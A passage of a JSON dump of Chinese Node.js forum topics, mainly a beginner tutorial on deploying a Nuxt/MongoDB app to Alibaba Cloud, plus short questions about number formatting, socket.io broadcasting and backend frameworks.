credentials","last_reply_at":"2018-12-04T04:48:36.657Z","good":false,"top":false,"reply_count":1,"visit_count":453,"create_at":"2018-12-04T04:46:55.428Z","author":{"loginname":"dengnan123","avatar_url":"https://avatars3.githubusercontent.com/u/25699654?v=4&s=120"}},{"id":"5ae169307b0e8dc508cca7d6","author_id":"5aa89c9919b2e3db18959d6d","tab":"share","content":"<div class=\"markdown-text\"><h2>购买服务器</h2>\n<blockquote>\n<p>目前市面上的云服务器有很多可供选择,比如:腾讯云、阿里云、华为云等等五花八门,大家可自行选择,使用套路都差不多,本文以阿里云ECS为例。</p>\n</blockquote>\n<blockquote>\n<p>配置: 系统:centos_7</p>\n</blockquote>\n<h2>创建nuxt项目</h2>\n<blockquote>\n<p>为啥选择nuxt项目、nuxt的优缺点、以及如何创建nuxt项目不是本文的中心,可以看本人的另一篇文章<a href=\"https://www.itcnz.top/20180320/mynuxt.html\">vue+nuxt+sass+node+express+MongoDB 实现的文章发布系统</a>\n。此次要部署的项目以此为例,有需要源码的也可去本人<a href=\"https://github.com/ITCNZ/mynuxt\">Github</a>去clone。</p>\n</blockquote>\n<h2>部署项目</h2>\n<h3>登录阿里云ECS</h3>\n<blockquote>\n<p>进入到阿里云控制台,创建服务器实例之后点击右边的&quot;远程链接&quot;进入到登录界面\n<img src=\"https://user-gold-cdn.xitu.io/2018/4/26/1630079f79acdedf?w=698&amp;h=466&amp;f=png&amp;s=52521\" alt=\"阿里云ECS\"></p>\n</blockquote>\n<blockquote>\n<p>输入账号密码, 如果忘记了可以重新设置</p>\n</blockquote>\n<blockquote>\n<p>具体可以参考 <a href=\"https://help.aliyun.com/document_detail/25433.html?spm=a2c4g.11186623.6.607.OBxk6Q\">阿里云官网文档</a>\n<img src=\"https://user-gold-cdn.xitu.io/2018/4/26/163007a2fb15a87a?w=1572&amp;h=598&amp;f=png&amp;s=150600\" alt=\"阿里云官网文档\"></p>\n</blockquote>\n<h3>安装node、npm</h3>\n<blockquote>\n<p>1.开始安装Node.js，先进入/root文件夹(安装在/root目录下,也可以指定到自定义目录下)，这个文件夹通常用来存放软件源代码:</p>\n</blockquote>\n<pre class=\"prettyprint\"><code>cd &#x2F;root\n</code></pre><blockquote>\n<p>2.从 Node.js的站点 中获取压缩档源代码, 我选择的版本为v9.10.0(可以直接复制下面代码,修改自己需要的版本就可以)：</p>\n</blockquote>\n<pre class=\"prettyprint\"><code>wget https:&#x2F;&#x2F;nodejs.org&#x2F;dist&#x2F;v9.10.0&#x2F;node-v9.10.0-linux-x64.tar.xz\n</code></pre><blockquote>\n<p>3.解压缩源文件，并且进入到压缩后的文件夹中:</p>\n</blockquote>\n<pre class=\"prettyprint\"><code>tar xvf node-v9.10.0-linux-x64.tar.xz\n</code></pre><blockquote>\n<p>4.创建软连接,全局才可以使用node和npm:</p>\n</blockquote>\n<pre class=\"prettyprint\"><code>ln -s &#x2F;root&#x2F;node-v9.10.0-linux-x64&#x2F;bin&#x2F;node &#x2F;usr&#x2F;local&#x2F;bin&#x2F;node\nln -s &#x2F;root&#x2F;node-v9.10.0-linux-x64&#x2F;bin&#x2F;npm &#x2F;usr&#x2F;local&#x2F;bin&#x2F;npm\n</code></pre><blockquote>\n<p>5.现在已经安装了Node.js, 可以开始部署应用程序, 首先要使用Node.js的模块管理器npm安装pm2.</p>\n</blockquote>\n<pre class=\"prettyprint\"><code>npm install pm2 -g\n</code></pre><blockquote>\n<p>6.创建pm2的软连接</p>\n</blockquote>\n<pre class=\"prettyprint\"><code>ln -s &#x2F;root&#x2F;node-v9.10.0-linux-x64&#x2F;bin&#x2F;pm2 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;pm2\n</code></pre><h3>安装mongodb</h3>\n<blockquote>\n<p>1.安装说明：</p>\n</blockquote>\n<pre class=\"prettyprint\"><code>安装软件：mongodb-linux-x86_64-2.4.9.tgz\n\n下载地址： http:&#x2F;&#x2F;fastdl.mongodb.org&#x2F;linux&#x2F;mongodb-linux-x86_64-2.4.9.tgz\n\n上传位置：&#x2F;root\n\n软件安装位置：&#x2F;root&#x2F;mongodb\n\n数据存放位置：&#x2F;var&#x2F;mongodb&#x2F;data日志存放位置：&#x2F;var&#x2F;mongodb&#x2F;logs\n</code></pre><blockquote>\n<p>2.进入文件夹/root,下载mongodb源代码：</p>\n</blockquote>\n<pre class=\"prettyprint\"><code>cd &#x2F;root\nwget http:&#x2F;&#x2F;fastdl.mongodb.org&#x2F;linux&#x2F;mongodb-linux-x86_64-2.4.9.tgz\n</code></pre><blockquote>\n<p>3.解压安装包，重命名文件夹为mongodb</p>\n</blockquote>\n<pre class=\"prettyprint\"><code>tar zxvf mongodb-linux-x86_64-2.4.9.tgz\nmv mongodb-linux-x86_64-2.4.9 mongodb\n</code></pre><blockquote>\n<p>4.在var文件夹里建立mongodb文件夹，并分别建立文件夹data用于存放数据，logs用于存放日志</p>\n</blockquote>\n<pre class=\"prettyprint\"><code>mkdir &#x2F;var&#x2F;mongodb\nmkdir &#x2F;var&#x2F;mongodb&#x2F;data\nmkdir &#x2F;var&#x2F;mongodb&#x2F;logs\n</code></pre><blockquote>\n<p>5.打开rc.local文件，添加CentOS开机启动项：</p>\n</blockquote>\n<pre class=\"prettyprint\"><code>1. vim &#x2F;etc&#x2F;rc.d&#x2F;rc.local 默认进去是普通模式，不能写入;\n\n2. 输入i命令，注意：”i”, 不是”:i”, 然后就可以写了;\n\n3. 然后按esc,回到普通模式，输入:w,保存，:q退出，回到控制台。\n</code></pre><blockquote>\n<p>6.将mongodb启动命令追加到本文件中，让mongodb开机自启动：</p>\n</blockquote>\n<pre class=\"prettyprint\"><code>&#x2F;root&#x2F;mongodb&#x2F;bin&#x2F;mongod --dbpath=&#x2F;var&#x2F;mongodb&#x2F;data --logpath &#x2F;var&#x2F;mongodb&#x2F;logs&#x2F;log.log -fork\n</code></pre><blockquote>\n<p>7.启动mongodb</p>\n</blockquote>\n<pre class=\"prettyprint\"><code>&#x2F;root&#x2F;mongodb&#x2F;bin&#x2F;mongod --dbpath=&#x2F;var&#x2F;mongodb&#x2F;data --logpath &#x2F;var&#x2F;mongodb&#x2F;logs&#x2F;log.log -fork\n</code></pre><blockquote>\n<p>8.看到如下信息说明已经安装完成并成功启动:</p>\n</blockquote>\n<pre class=\"prettyprint\"><code>forked process: 11221\nall output going to: &#x2F;var&#x2F;mongodb&#x2F;logs&#x2F;log.log\nchild process started successfully, parent exiting\n</code></pre><h3>上传项目代码</h3>\n<blockquote>\n<p>1.可以安装任意一款 ftp上传工具,此处推荐FileZilla,链接\n<img src=\"https://user-gold-cdn.xitu.io/2018/4/26/163007b43b24759b?w=1164&amp;h=894&amp;f=png&amp;s=152585\" alt=\"阿里云官网文档\"></p>\n</blockquote>\n<blockquote>\n<p>代码前期准备</p>\n</blockquote>\n<pre class=\"prettyprint\"><code>1.在本地执行命令:npm run build 生成 .nuxt目录\n\n2.配置package.json文件新增\n\n&quot;config&quot;: {\n    &quot;nuxt&quot;: {\n      &quot;host&quot;: &quot;0.0.0.0&quot;,\n      &quot;port&quot;: 80\n    }\n  }\n\n</code></pre><blockquote>\n<p>3.在/home下创建app文件夹,将上一步生成的.nuxt文件和package.json、server等文件上传到该文件夹\n<img src=\"https://user-gold-cdn.xitu.io/2018/4/26/163007b43b3fc486?w=616&amp;h=694&amp;f=png&amp;s=71743\" alt=\"阿里云官网文档\"></p>\n</blockquote>\n<blockquote>\n<p>启动项目</p>\n</blockquote>\n<pre class=\"prettyprint\"><code> 1.npm install 安装依赖包文件\n\n 2. cd app&#x2F;server文件夹下 &quot;pm2 start listrouter.js 启动服务接口\n\n 3. cd app&#x2F;目录下 &quot;pm2 start npm --name &quot;mynuxt&quot; -- start 启动前端\n</code></pre><p>至此,代码部署完毕, 浏览器输入 “你的外网IP:端口号”(80端口可以不写) 就可启动项目了。<a href=\"http://47.104.245.86\">点击查看demo</a></p>\n<blockquote>\n<p>如果,启动80端口被占</p>\n</blockquote>\n<p><img src=\"https://user-gold-cdn.xitu.io/2018/4/26/163007b66bef684d?w=1424&amp;h=156&amp;f=png&amp;s=57470\" alt=\"阿里云官网文档\"></p>\n<pre class=\"prettyprint\"><code>1. 首先sudo netstat -apn | grep 80 查看那些程序占了端口;\n\n2. kill 25141\n</code></pre><h2>总结</h2>\n<p>第一次用阿里云,有许多还不太会,初级入门的可以看看,大佬可以忽略。需要了解更多信息，可以查看<a href=\"https://www.itcnz.top\">我的博客</a></p>\n</div>","title":"阿里云部署nuxt项目","last_reply_at":"2018-12-04T03:24:15.198Z","good":false,"top":false,"reply_count":4,"visit_count":3239,"create_at":"2018-04-26T05:52:48.719Z","author":{"loginname":"ITCNZ","avatar_url":"https://avatars1.githubusercontent.com/u/17981388?v=4&s=120"}},{"id":"5aa89cc5ce4a27f8675270ae","author_id":"5aa89c9919b2e3db18959d6d","tab":"share","content":"<div class=\"markdown-text\"><p>因为目前的spa单页项目对seo很不友好，如果你希望自己的网站在seo这块有较好的支持，可以尝试一下SSR技术，nuxt.js就是专门针对vue这一问题实现的技术，因此这一次我就尝试写了一个项目，主要实现的一个简单的文章的增删改查系统，主要为实现nuxt集合node实现ssr功能。</p>\n<p>新人可以学习下<a href=\"https://github.com/ITCNZ/mynuxt\">https://github.com/ITCNZ/mynuxt</a> （如果觉得还不错请给个✨✨✨star星星吧✨✨✨）\n也可以加 nuxt技术交流群：群号:320243648</p>\n<p><strong>该项目使用的到的技术比较多：</strong></p>\n<ul>\n<li>vue2.0</li>\n<li>nuxt1.0</li>\n<li>sass</li>\n<li>node9.8(必须&gt;=8.0)</li>\n<li>express</li>\n<li>MongoDB</li>\n</ul>\n<p>实现的功能有：</p>\n<blockquote>\n<p><strong>创建文章\n修改文章\n删除文章\n查看文章</strong></p>\n</blockquote>\n<p>案例展示：</p>\n<p>登录界面：\n<img src=\"//static.cnodejs.org/FnJblAE4jOimFjSQpBzIHN0tJXHn\" alt=\"2222222.png\"></p>\n<p>创建/修改界面\n<img src=\"//static.cnodejs.org/Fuu-BXxNCcOZlXbcwrrLHkGHhiap\" alt=\"33333.png\"></p>\n<p>文章列表界面：\n<img src=\"//static.cnodejs.org/Fk5G4X7kUkWqdr-950OkelV_aUVN\" alt=\"333.png\"></p>\n<p>文章展示界面：\n<img src=\"https://img.golang123.com/upload/img/2018/03/48d51f58-ca10-4723-b6f1-a55ba76458ca.png\" alt></p>\n</div>","title":"vue+nuxt+sass+node+express+MongoDB 实现的文章发布系统","last_reply_at":"2018-12-04T03:21:53.277Z","good":false,"top":false,"reply_count":16,"visit_count":6340,"create_at":"2018-03-14T03:53:41.612Z","author":{"loginname":"ITCNZ","avatar_url":"https://avatars1.githubusercontent.com/u/17981388?v=4&s=120"}},{"id":"5c01f6c7d6104a4f803a3575","author_id":"58ea2cec3145ae3f25fe60ac","tab":"ask","content":"<div class=\"markdown-text\"><p>有这么这个api</p>\n<pre class=\"prettyprint\"><code>curl --request PATCH \\\n  --url https:&#x2F;&#x2F;test.com&#x2F;api&#x2F;v1&#x2F;money \\\n  --header &#x27;content-type: application&#x2F;json&#x27; \\\n  --data &#x27;{\n\t&quot;amount&quot;: 100.00\n}&#x27;\n</code></pre><ul>\n<li>amount只支持带有两位小数点的数字</li>\n<li>这样是不行的🙅‍♂️ { “amount”: “100.00” }</li>\n<li>这样也是不行的🙅 { “amount”: 100 }</li>\n<li>这样是可以的👌 { “amount”: 100.01 }</li>\n</ul>\n<h4>问题：</h4>\n<ul>\n<li>在请求api的时候如何把 100 变成 100.00 ?</li>\n</ul>\n</div>","title":"nodejs里面如何把整数100变成浮点数100.00 放到请求里面？","last_reply_at":"2018-12-04T03:14:35.999Z","good":false,"top":false,"reply_count":13,"visit_count":810,"create_at":"2018-12-01T02:49:43.254Z","author":{"loginname":"CNBlackJ","avatar_url":"https://avatars0.githubusercontent.com/u/21023227?v=4&s=120"}},{"id":"5c05ec811c62d83349350669","author_id":"56dd73d7f5d830306e2f0e89","tab":"share","content":"<div class=\"markdown-text\"><h1>pm2-server-monitor</h1>\n<p>The monitor for pm2 servers, with nice web UI.</p>\n<h2>Preview</h2>\n<p><img src=\"https://raw.githubusercontent.com/eshengsky/pm2-server-monitor/master/preview.png\" alt=\"image\"></p>\n<h2>Repository</h2>\n<p><a href=\"https://github.com/eshengsky/pm2-server-monitor\">https://github.com/eshengsky/pm2-server-monitor</a></p>\n</div>","title":"pm2-server-monitor: 基于PM2的简单服务器监控","last_reply_at":"2018-12-04T02:54:57.105Z","good":false,"top":false,"reply_count":0,"visit_count":609,"create_at":"2018-12-04T02:54:57.105Z","author":{"loginname":"eshengsky","avatar_url":"https://avatars2.githubusercontent.com/u/9640122?v=4&s=120"}},{"id":"5c05ccb41c62d833493504e1","author_id":"5c03588b39c0af64fddb7c69","tab":"ask","content":"<div class=\"markdown-text\"><p>以下是课程大纲链接:\n<a href=\"http://www.itcast.cn/course/web.shtml?skc\">http://www.itcast.cn/course/web.shtml?skc</a>\n新手小白迷茫中,如果之后要往nodejs后端发展,现学知识体系是否可行,还是说还需学一些其他的才能适应后端</p>\n</div>","title":"还请好心大佬告知,黑马学的web前端,里面有nodejs教学,之后是否可以往nodejs后端发展?","last_reply_at":"2018-12-04T01:08:16.466Z","good":false,"top":false,"reply_count":1,"visit_count":539,"create_at":"2018-12-04T00:39:16.607Z","author":{"loginname":"Tewii233","avatar_url":"https://avatars2.githubusercontent.com/u/45483911?v=4&s=120"}},{"id":"5ba259a315e4fd1923f4891f","author_id":"5b509c2ffb9e84ec69cc1c2d","tab":"share","content":"<div class=\"markdown-text\"><p><strong>Mongodb+Mongoose中高级教程下载地址【20讲】：</strong> <a href=\"https://pan.baidu.com/s/1Dva3FBLYILWSPubHy8kOFA\">https://pan.baidu.com/s/1Dva3FBLYILWSPubHy8kOFA</a></p>\n<p><strong>2018 Nodejs+Koa2入门实战视频教程百度网盘下载地址【41讲】：</strong></p>\n<p><a href=\"https://pan.baidu.com/s/1KNaA97kGwNhavch5rP_G7w\">https://pan.baidu.com/s/1KNaA97kGwNhavch5rP_G7w</a></p>\n<p><strong>地址失效访问：</strong>：<a href=\"https://www.itying.com/goods-800.html\">地址失效点我</a></p>\n<p>希望老铁们喜欢。上面都是百度网盘直接下载哦！</p>\n<p><strong>MongoDB视频教程包括：</strong></p>\n<p>MongoDB安装、MongoDB增删改查、MongoDB索引、MongoDB权限管理、MongoDB聚合管道、MongoDB aggregate聚合管道 多表关联查询。</p>\n<p><strong>Mongoose视频教程包括：</strong></p>\n<p>Mongoose的安装、mongoose增删改查、mongoose默认参数 、mongoose模块化、Mongoose 预定义模式修饰符、自定义修饰符、Mongoose索引、扩展Mongoose内置查询方法、Mongoose 数据校验、Mongoose两个表关联查询aggregate、MongooseN个表关联查询aggregate、Mongoose、 DBRef  Populate。</p>\n</div>","title":"【网盘分享】Mongodb+Mongoose中高级教程涉及mongodb用户权限验证、Mongodb aggregate聚合管道（多集合关联查询）Mongoose入门实战","last_reply_at":"2018-12-03T18:28:32.081Z","good":false,"top":false,"reply_count":17,"visit_count":2097,"create_at":"2018-09-19T14:13:55.479Z","author":{"loginname":"gogogosns","avatar_url":"https://avatars2.githubusercontent.com/u/41439393?v=4&s=120"}},{"id":"5bf89ac6d6104a4f803a10e8","author_id":"4efc278625fa69ac690005b1","tab":"ask","content":"<div class=\"markdown-text\"><p>egg是否有些太重？\napi返回结果是否有约定的标准之类的？</p>\n</div>","title":"api接口，后端用什么框架方便？","last_reply_at":"2018-12-03T14:58:38.191Z","good":false,"top":false,"reply_count":15,"visit_count":1565,"create_at":"2018-11-24T00:26:46.548Z","author":{"loginname":"hunk","avatar_url":"//gravatar.com/avatar/7d3c19500e2ed481fea3ab09f91e3856?s=48"}},{"id":"5c046c1839c0af64fddb7eff","author_id":"545b74143e1f39344c5b3bee","tab":"ask","content":"<div class=\"markdown-text\"><p>有时候数组中东西多，一个个看过来，挺麻烦</p>\n</div>","title":"有什么编辑器支持检测数组中是否包含重复元素？","last_reply_at":"2018-12-03T10:52:23.995Z","good":false,"top":false,"reply_count":2,"visit_count":537,"create_at":"2018-12-02T23:34:48.984Z","author":{"loginname":"chapgaga","avatar_url":"https://avatars0.githubusercontent.com/u/9590859?v=4&s=120"}},{"id":"5c008d17be1b120abac5e5b2","author_id":"5976b9b80c87675e74674819","tab":"ask","content":"<div class=\"markdown-text\"><p>直接上代码，代码如下：\nlet isFirst1 = 1;\nsockets.forEach((socket)=&gt;{\nif(isFirst1 == 1) {\n<a href=\"http://lightLog.info\">lightLog.info</a>(‘推送计算结果bonus事件’,dataArr);\nsocket.emit(‘bonus1’,dataArr,function(data) {\n<a href=\"http://lightLog.info\">lightLog.info</a>(‘qqqqqq’);\nif(data.length) {\n<a href=\"http://lightLog.info\">lightLog.info</a>(‘向聊天室推送的内容消息为：’,dataArr);\n}else{\n<a href=\"http://lightLog.info\">lightLog.info</a>(‘推送的内容内容为空’);\n}\n});\n// socket.broadcast.emit(‘bonus1’,dataArr);\nisFirst1 = 0;\n}else{\n<a href=\"http://lightLog.info\">lightLog.info</a>(‘不推送数据’);\n}\n});\n代码的目的是想实现只推送一次，但是现在的问题是，当使用isFirst1标志的时候，只发送给自己，不广播事件，这个时候事件发不出去，当把isFirst1标志去掉的时候，就可以，但是这个时候就会推送多次，请问如果我只想推送一次，应该来怎么做呢？？？</p>\n</div>","title":"socket使用求助","last_reply_at":"2018-12-03T10:17:15.619Z","good":false,"top":false,"reply_count":2,"visit_count":724,"create_at":"2018-11-30T01:06:31.970Z","author":{"loginname":"quanpf2481","avatar_url":"https://avatars3.githubusercontent.com/u/30330930?v=4&s=120"}}]}